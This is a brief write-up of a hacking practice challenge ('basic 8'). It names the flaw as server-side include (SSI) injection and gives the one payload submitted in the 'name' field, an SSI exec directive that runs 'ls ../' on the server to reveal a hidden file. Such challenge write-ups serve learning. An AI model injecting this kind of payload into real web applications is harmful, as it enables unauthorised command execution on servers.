# Basic missions: basic 8

The vulnerability is a classic [SSI injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) (server-side includes). 

We submit the following command (as "name") to find the hidden file:

```
<!--#exec cmd="ls ../"-->
```
